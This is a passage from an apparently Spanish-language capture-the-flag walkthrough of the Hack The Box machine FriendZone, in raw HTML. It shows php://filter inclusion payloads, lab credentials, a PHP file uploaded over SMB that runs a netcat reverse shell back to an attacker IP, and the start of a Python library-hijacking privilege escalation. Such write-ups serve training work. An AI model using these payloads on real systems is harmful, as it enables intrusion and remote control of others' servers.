&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;//echo &amp;#34;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//echo &amp;#34;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;title&amp;gt;FriendZone Admin !&amp;lt;/title&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$auth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;FriendZoneAuth&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$auth&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;e7749d0f4b4da5d03e6e9196fd1d18f1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Smart photo script for friendzone corp !&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;image_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;image_name param is missed !&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;please enter it to show the image&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;default is image_id=a.jpg&amp;amp;pagename=timestamp&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;$image&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;image_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;img src=&amp;#39;images/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$image&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

 &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Something went worng ! , the script include wrong param !&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pagename&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;span class=&#34;c1&#34;&gt;//echo $_GET[&amp;#34;pagename&amp;#34;];
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;You can&amp;#39;t see the content ! , please login !&amp;lt;/center&amp;gt;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;pagename=php://filter/convert.base64-encode/resource=timestamp&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$time_final&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Final Access timestamp is &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$time_final&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;pagename=php://filter/convert.base64-encode/resource=../www/admin/login&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;//echo $username === &amp;#34;admin&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//echo strcmp($username,&amp;#34;admin&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WORKWORKHhallelujah@#&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;FriendZoneAuth&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;e7749d0f4b4da5d03e6e9196fd1d18f1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 86400 = 1 day
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Login Done ! visit /dashboard.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Wrong !&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;obteniendo-acceso&#34;&gt;OBTENIENDO ACCESO&lt;/h2&gt;
&lt;p&gt;Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename &lt;code&gt;Files&lt;/code&gt; es en &lt;code&gt;/etc/Files&lt;/code&gt; por lo que concluimos que &lt;code&gt;Development y general&lt;/code&gt; estan en la carpeta &lt;code&gt;/etc/Development&lt;/code&gt; y &lt;code&gt;/etc/general&lt;/code&gt;, de los cuales solo tenemos acceso a &lt;code&gt;Development&lt;/code&gt;, procedemos a subir un archivo en samba con el sharename &lt;code&gt;Development&lt;/code&gt; y hacer una solicitud a la carpeta &lt;code&gt;/etc/Development/NuestroArchivo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*batman.php*&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;echo &amp;#39;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/center&amp;gt;&amp;lt;h1&amp;gt;Yo soy Batman&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;#39; &amp;gt; batman.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;smbclient&#34;&gt;Smbclient&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;smbclient \\\\10.10.10.123\\Development --user=admin WORKWORKHhallelujah@#
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; put batman.php
putting file batman.php as \batman.php (0.0 kb/s) (average 0.0 kb/s)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_190550.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Solicitud&lt;/em&gt;:&lt;br /&gt;
&lt;code&gt;https://administrator1.friendzone.red/dashboard.php?pagename=php://filter/resource=/etc/Development/batman&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_190722.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Como podemos ver nuestro archivo con un simple texto se ejecuta, de la misma forma podemos ejecutar comandos mediante php y asi obtener una shell inversa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;echo &amp;#39;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.15.78 7878 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&amp;#39; &amp;gt; batman_sh.php
put batman_sh.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_191406.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvp 7878
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_192037.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user-flag&#34;&gt;USER Flag&lt;/h2&gt;
&lt;p&gt;Para el user flag solo falto un poco de enumeracion en los archivos locales y en la configuracion de la base de datos mysql del servidor encontramos un usuario y contraseña de un usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_192437.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh friend@10.10.10.123
Password: Agpyu12!0.213$
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-shell&#34;&gt;ROOT SHELL&lt;/h2&gt;
&lt;p&gt;Utilizando pspy para encontrar tareas que se ejecutan como usuario root logramos ver una que se encuentra dentro de la carpeta &lt;code&gt;/opt&lt;/code&gt;, es un script escrito en python llamado &lt;code&gt;reporter.py&lt;/code&gt;, el cual tiene permisos root, dentro del script podemos ver que importa la libreria os e imprime algunos mensajes.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/DominicBreuker/pspy/&#34;&gt;&lt;em&gt;Github - pspy&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190214_144430.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;opt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server_admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reporter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; 
&lt;span class=&#34;c1&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;to_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin1@friendzone.com&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;from_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin2@friendzone.com&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] Trying to send email to &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_address&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#command = &amp;#39;&amp;#39;&amp;#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &amp;#34;PAPAP&amp;#34;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#os.system(command)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# I need to edit the script later&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Sam ~ python developer&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando la tecnica de &lt;em&gt;Python Library Hijacking&lt;/em&gt; podemos obtener una shell inversa editando la libreria os.py que se encuentra en &lt;code&gt;/usr/lib/python2.7/os.py&lt;/code&gt; podemos utilizar el siguiente codigo.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&#34;&gt;&lt;em&gt;rastating - Python Library Hijacking&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
